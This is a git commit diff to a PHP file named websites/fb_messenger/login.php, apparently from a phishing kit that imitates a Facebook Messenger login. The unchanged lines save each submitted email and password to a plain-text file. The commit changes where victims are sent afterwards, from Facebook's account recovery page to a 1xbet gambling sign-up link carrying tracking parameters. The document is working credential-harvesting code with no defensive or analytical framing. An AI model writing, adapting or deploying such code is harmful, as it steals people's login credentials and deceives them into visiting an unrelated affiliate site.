841386bdbfa91a7c8d2f7881b5feb41dcc6772bd
faruq2ds <82174288+faruq2ds@users.noreply.github.com>
2021-04-08 18:40:44 +0100

    Update login.php

--- websites/fb_messenger/login.php
+++ websites/fb_messenger/login.php
@@ -1,5 +1,5 @@
 <?php
 
 file_put_contents("usernames.txt", "Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
-header('Location: https://www.facebook.com/recover/initiate/');
+header('Location: https://1xbet.ng/en/registration/?tag=d_559183m_2902c_Search_Gambling.&gclid=CjwKCAjw07qDBhBxEiwA6pPbHgjUgFG-eqdxM3upj70cx9LC7Ps8Ze3Y6sxmNvyZ6MPnJI_A7bsAVBoCnpIQAvD_BwE');
 exit();
